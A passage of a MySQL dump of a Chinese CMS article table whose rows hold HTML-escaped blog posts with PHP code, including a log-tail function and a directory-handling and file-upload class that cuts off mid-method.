%3B%0A%7D%0Avar_dump(tail(fopen(%22access.log%22%2C%22r%2B%22)%2C10))%3B&quot; quality=&quot;high&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&amp;nbsp;&lt;a href=&quot;http://justcoding.iteye.com/blog/986293&quot; title=&quot;收藏这段代码&quot; style=&quot;color:#006600;text-decoration:underline;&quot;&gt;&lt;img class=&quot;star&quot; src=&quot;http://justcoding.iteye.com/images/icon_star.png&quot; alt=&quot;收藏代码&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;tail(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$n&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$base&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;=5)&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;assert(&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$n&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;gt;0);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$pos&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$n&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;+1;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$lines&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;array&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;();&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;while&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$lines&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;lt;&amp;nbsp;=&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$n&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;try{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fseek&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,-&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$pos&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,SEEK_END);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;catch&amp;nbsp;(Exception&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$e&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fseek&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(0);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;break&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$pos&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;*=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$base&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;while&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;feof&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)){&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;array_unshift&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$lines&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&l', 1, 1, 0, 0, 1302426515, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(38, 1, 'php目录处理类-php上传文件类', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:arial, sans-serif, helvetica, tahoma;&quot;&gt;&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;该上传类，支持目录的操作，多文件上传..功能;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;File.class.php代码:&lt;/p&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; id=&quot;&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;font-size:12px;background-color:transparent;width:694px;overflow-x:auto;overflow-y:auto;margin-left:9px;padding-top:1px;padding-right:1px;padding-bottom:1px;padding-left:1px;word-break:break-all;word-wrap:break-word;&quot;&gt;&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;tools&quot; style=&quot;padding-top:3px;padding-right:3px;padding-bottom:3px;padding-left:3px;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;color:black;font-weight:bold;&quot;&gt;Php代码&amp;nbsp;&lt;embed src=&quot;http://lansexin313.iteye.com/javascripts/syntaxhighlighter/clipboard_new.swf&quot; width=&quot;14&quot; height=&quot;15&quot; flashvars=&quot;clipboard=%3C%3Fphp%0A%2F**%0A%20*%20%E6%96%87%E4%BB%B6%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B1%BB%3B%0A%20*%20%40author%20lansexin%0A%20*%2F%0Aclass%20File%20%7B%0A%09var%20%24allow_type%3B%09%2F%2F%E5%85%81%E8%AE%B8%E7%9A%84%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%3B%0A%09var%20%24moveto%3B%09%09%2F%2F%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E5%9C%B0%E5%9D%80%3B%0A%09var%20%24maxsize%3B%09%09%2F%2F%E6%96%87%E4%BB%B6%E7%9A%84%E6%9C%80%E5%A4%A7%E5%A4%A7%E5%B0%8F%3B%0A%09var%20%24rand%3B%09%09%09%2F%2F%E6%98%AF%E5%90%A6%E9%9A%8F%E6%9C%BA%E4%BA%A7%E7%94%9F%E6%96%87%E4%BB%B6%E5%90%8D%20%3B%0A%09%0A%09function%20__construct(%24arr)%7B%0A%09%09if(!empty(%24arr))%7B%0A%09%09%09%24type%09%09%09%09%3D%09explode(''%2C''%2C%24arr%5B''type''%5D)%3B%09%0A%09%09%09%24this-%3Eallow_type%09%3D%09(is_array(%24type)%26%26%24arr%5B''type''%5D)%3F%24type%3Aarray(''txt''%2C''gif''%2C''png''%2C''jpg'')%3B%09%2F%2F%E9%BB%98%E8%AE%A4%E7%9A%84%E7%B1%BB%E5%9E%8B%3B%0A%09%09%09%24this-%3Emoveto%09%09%3D%09%24arr%5B''moveto''%5D%3B%09%09%09%09%09%09%09%09%09%09%2F%2F%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%9B%AE%E5%BD%95%3B%0A%09%09%09%24this-%3Emaxsize%09%09%3D%09%24arr%5B''size''%5D%3F%24arr%5B''size''%5D%3A(1024*1024*2)%3B%09%09%09%2F%2F%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%A4%A7%E5%B0%8F%E9%99%90%E5%88%B6%3B%0A%09%09%09%24this-%3Erand%09%09%09%3D%09%24arr%5B''rand''%5D%3Ftrue%3Afalse%3B%09%09%09%09%09%09%09%2F%2F%E6%98%AF%E5%90%A6%E9%9A%8F%E6%9C%BA%E4%BA%A7%E7%94%9F%E6%96%87%E4%BB%B6%E5%90%8D%20%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09%2F**%0A%09%20*%20%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%AE%E5%BD%95%E5%92%8C%E6%96%87%E4%BB%B6%3B%0A%09%20*%20%24dir%20%20%E8%A6%81%E9%81%8D%E5%8E%86%E7%9A%84%E7%9B%AE%E5%BD%95%3B%0A%09%20*%2F%0A%09%20function%20getMenu(%24dir)%20%7B%0A%09%09%24menu%20%3D%20opendir%20(%20%24dir%20)%3B%0A%09%09%24farr%20%3D%20array%20()%3B%0A%09%09while%20(%20%24fileName%20%3D%20readdir%20(%20%24menu%20)%20)%20%7B%20%2F%2F%E9%81%8D%E5%8E%86%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%AE%8C%E5%90%8E%E6%8C%87%E9%92%88%E5%90%8E%E7%A7%BB%E4%B8%80%E4%B8%AA%EF%BC%9B%0A%09%09%09%24file%20%3D%20%24dir%20.%20%22%2F%22%20.%20%24fileName%3B%0A%09%09%09if%20(%24fileName%20!%3D%20''.''%20%26%26%20%24fileName%20!%3D%20''..'')%20%7B%0A%09%09%09%09if%20(is_dir%20(%20%24file%20))%20%7B%0A%09%09%09%09%09%24tmp%09%3D%09%24this-%3EgetMenu(%24file)%3B%0A%09%09%09%09%09%24farr%20%5B''menu''%5D%20%5B%24fileName%5D%20%3D%20%24tmp%3B%0A%09%09%09%09%7D%20else%20%7B%0A%09%09%09%09%09%24farr%20%5B%24dir%5D%20%5B%5D%20%3D%20%24fileName%3B%20%2F%2F%E4%B8%8D%E5%90%8C%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%3B%0A%09%09%09%09%7D%0A%09%09%09%7D%0A%09%09%7D%0A%09%09closedir%20(%20%24menu%20)%3B%0A%09%09return%20%24farr%3B%0A%09%7D%0A%09%0A%09%2F**%0A%09%20*%20%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%2C%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%8C%E5%88%9B%E5%BB%BA%E6%97%B6%E9%97%B4...%0A%09%20*%20%40param%20resource%20%24file%0A%09%20*%2F%0A%09%20function%20getInfo(%24file)%20%7B%0A%09%09if%20(!%20file_exists%20(%20%24file%20))%0A%09%09%09return%20null%3B%0A%09%09if%20(is_file%20(%20%24file%20))%20%7B%20%2F%2F%E6%96%87%E4%BB%B6%3B%0A%09%09%09%24f%20%5B''size''%5D%20%3D%20%24this-%3Etosize(%20filesize%20(%20%24file%20)%20)%3B%0A%09%09%7D%20else%20if%20(is_dir%20(%20%24file%20))%20%7B%20%2F%2F%E7%9B%AE%E5%BD%95%0A%09%09%09%24f%20%5B''size''%5D%20%3D%20%24this-%3Etosize(%24this-%3Edirsize%20(%20%24file%20))%3B%0A%09%09%7D%0A%09%09%24f%20%5B''ctime''%5D%20%3D%20date%20(%20''Y-m-d%20H%3Ai%3As''%2C%20filectime%20(%20%24file%20)%20)%3B%0A%09%09%24f%20%5B''mtime''%5D%20%3D%20date%20(%20''Y-m-d%20H%3Ai%3As''%2C%20filemtime%20(%20%24file%20)%20)%3B%0A%09%09%24f%20%5B''type''%5D%20%3D%20filetype%20(%20%24file%20)%3B%0A%09%09return%20%24f%3B%0A%09%7D%0A%09%0A%09%2F**%0A%09%20*%20%E5%A4%8D%E5%88%B6%E7%9B%AE%E5%BD%95%0A%09%20*%20%40param%20dir%20%24dir%0A%09%20*%2F%0A%09function%20copydir(%24dir%2C%24dirto)%7B%0A%09%09if(is_file(%24dirto))%7B%0A%09%09%09echo%20%22%E4%B8%8D%E6%98%AF%E7%9B%AE%E5%BD%95%E4%B8%8D%E8%83%BD%E5%A4%8D%E5%88%B6%22%3B%0A%09%09%09return%20%3B%0A%09%09%7D%0A%09%09if(!file_exists(%24dirto))%7B%0A%09%09%09mkdir(%24dirto)%3B%0A%09%09%7D%0A%09%09%24menu%09%3D%09opendir(%24dir)%3B%0A%09%09while%20(%20%24filename%20%3D%20readdir%20(%20%24menu%20)%20)%20%7B%20%2F%2F%E9%81%8D%E5%8E%86%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%AE%8C%E5%90%8E%E6%8C%87%E9%92%88%E5%90%8E%E7%A7%BB%E4%B8%80%E4%B8%AA%EF%BC%9B%0A%09%09%09if%20(%24filename%20!%3D%20''.''%20%26%26%20%24filename%20!%3D%20''..'')%20%7B%0A%09%09%09%09%24f1%09%3D%09%24dir.''%2F''.%24filename%3B%0A%09%09%09%09%24f2%09%3D%09%24dirto.''%2F''.%24filename%3B%0A%09%09%09%09if%20(is_dir%20(%20%24f1%20))%20%7B%0A%09%09%09%09%09%24this-%3Ecopydir(%24f1%2C%24f2)%3B%0A%09%09%09%09%7Delse%7B%0A%09%09%09%09%09copy(%24f1%2C%24f2)%3B%0A%09%09%09%09%7D%0A%09%09%09%7D%0A%09%09%7D%0A%09%09closedir(%24menu)%3B%0A%09%7D%0A%09%0A%09%2F**%0A%09%20*%20%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A4%A7%E5%B0%8F%3B%0A%09%20*%20%40param%20dir%20%24dir%0A%09%20*%2F%0A%09%20function%20dirsize(%24dirname)%20%7B%0A%09%09%24dirsize%20%3D%200%3B%0A%09%09%24dir%20%3D%20opendir%20(%20%24dirname%20)%3B%0A%09%09while%20(%20%24filename%20%3D%20readdir%20(%20%24dir%20)%20)%20%7B%09%09%09%0A%09%09%09%24file%20%3D%20%24dirname%20.%20%22%2F%22%20.%20%24filename%3B%0A%09%09%09if%20(%24filename%20%3D%3D%20%22.%22%20%7C%7C%20%24filename%20%3D%3D%20%22..%22)%20%7B%0A%09%09%09%09continue%3B%0A%09%09%09%7D%09%0A%09%09%09if%20(is_dir%20(%20%24file%20))%20%7B%09%09%09%0A%09%09%09%09%24dirsize%20%2B%3D%20%24this-%3Edirsize%20(%20%24file%20)%3B%20%2F%2F%E9%80%92%E5%BD%92%E5%AE%8C%E6%88%90%09%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09%24dirsize%20%2B%3D%20filesize%20(%20%24file%20)%3B%09%09%09%09%09%0A%09%09%09%7D%0A%09%09%7D%0A%09%09closedir%20(%20%24dir%20)%3B%09%09%0A%09%09return%20%24dirsize%3B%0A%09%0A%09%7D%0A%09%0A%09%2F**%0A%09%20*%20%E9%81%8D%E5%8E%86%E5%88%A0%E9%99%A4%E7%9B%AE%E5%BD%95%3B%0A%09%20*%2F%0A%09function%20deldir(%24dir)%7B%0A%09%09if(file_exists(%24dir))%7B%0A%09%09%09%24f%09%3D%09opendir(%24dir)%3B%0A%09%09%09while(%24filename%3Dreaddir(%24f))%7B%0A%09%09%09%09if%20(%24filename%20!%3D%20''.''%20%26%26%20%24filename%20!%3D%20''..'')%20%7B%0A%09%09%09%09%09%24file%09%3D%09%24dir.%22%2F%22.%24filename%3B%0A%09%09%09%09%09if(is_dir(%24file))%7B%0A%09%09%09%09%09%09%24this-%3Edeldir(%24file)%3B%0A%09%09%09%09%09%7Delse%7B%0A%09%09%09%09%09%09unlink(%24file)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%7D%0A%09%09%09%7D%0A%09%09%09closedir(%24f)%3B%0A%09%09%09rmdir(%24dir)%3B%0A%09%09%7Delse%7B%0A%09%09%09return%20false%3B%0A%09%09%7D%0A%09%09return%20true%3B%0A%09%7D%0A%09%0A%09%2F**%0A%09%20*%20%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0%0A%09%20*%20%40param%20int%20%24size%0A%09%20*%2F%0A%09%20function%20tosize(%24size)%20%7B%0A%09%09if%20(%24size%20%3E%3D%20pow%20(%202%2C%2040%20))%20%7B%0A%09%09%09return%20round%20(%20%24size%20%2F%20pow%20(%202%2C%2040%20)%2C%202%20)%20.%20%22TB%22%3B%0A%09%09%7D%20elseif%20(%24size%20%3E%3D%20pow%20(%202%2C%2030%20))%20%7B%0A%09%09%09return%20round%20(%20%24size%20%2F%20pow%20(%202%2C%2030%20)%2C%202%20)%20.%20%22GB%22%3B%0A%09%09%7D%20elseif%20(%24size%20%3E%3D%20pow%20(%202%2C%2020%20))%20%7B%0A%09%09%09return%20round%20(%20%24size%20%2F%20pow%20(%202%2C%2020%20)%2C%202%20)%20.%20%22MB%22%3B%0A%09%09%7D%20elseif%20(%24size%20%3E%3D%20pow%20(%202%2C%2010%20))%20%7B%0A%09%09%09return%20round%20(%20%24size%20%2F%20pow%20(%202%2C%2010%20)%2C%202%20)%20.%20%22KB%22%3B%0A%09%09%7D%20else%20%7B%0A%09%09%09return%20round%20(%20%24size%2C%202%20)%20.%20%22Byte%22%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09%2F**--------------------------------------------------%0A%09%20*%20**************************************************%09%0A%09%20*%20*****************%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9**********************%0A%09%20*%20*************************************************%0A%09%20*--------------------------------------------------*%2F%0A%09%0A%09%2F**%0A%09%20*%20%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%3B%0A%09%20*%20Enter%20%24no%20%E9%94%99%E8%AF%AF%E6%95%B0%E5%AD%97%3B%0A%09%20*%2F%0A%09private%20function%20msg(%24no)%7B%0A%09%09%24msg%09%3D%09%22%22%3B%0A%09%09switch%20(%24no)%7B%0A%09%09%09case%200%3A%09%24msg%3D''success''%3Bbreak%3B%0A%09%09%09case%201%3A%09%24msg%3D''%E6%96%87%E4%BB%B6%E8%B6%85%E5%87%BA%E4%BA%86%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%A4%A7%E5%B0%8F''%3Bbreak%3B%0A%09%09%09case%202%3A%09%24msg%3D''%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%A7%E5%B0%8F%E8%B6%85%E8%BF%87%E4%BA%86%20HTML%E8%A1%A8%E5%8D%95%E4%B8%AD%20MAX_FILE_SIZE%20%E6%9C%80%E5%A4%9A%E5%80%BC''%3Bbreak%3B%0A%09%09%09case%203%3A%09%24msg%3D''%E6%96%87%E4%BB%B6%E5%8F%AA%E6%9C%89%E9%83%A8%E5%88%86%E4%B8%8A%E4%BC%A0''%3Bbreak%3B%0A%09%09%09case%204%3A%09%24msg%3D''%E6%B2%A1%E6%9C%89%E6%96%87%E4%BB%B6%E8%A2%AB%E4%B8%8A%E4%BC%A0''%3Bbreak%3B%0A%09%09%09default%3A%24msg%3D''%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%B1%E8%B4%A5''%3Bbreak%3B%0A%09%09%7D%0A%09%09return%20%24msg%3B%0A%09%7D%0A%09%2F**%0A%09%20*%20%E6%96%87%E4%BB%B6%E4%B8%8A%E5%82%B3%3B%0A%09%20*%2F%0A%09function%20upload()%7B%0A%09%09%24files%09%3D%09%24_FILES%3B%0A%09%09if(!empty(%24files))%7B%0A%09%09%09%24inputs%09%3D%09array_keys(%24files)%3B%0A%09%09%09foreach(%24i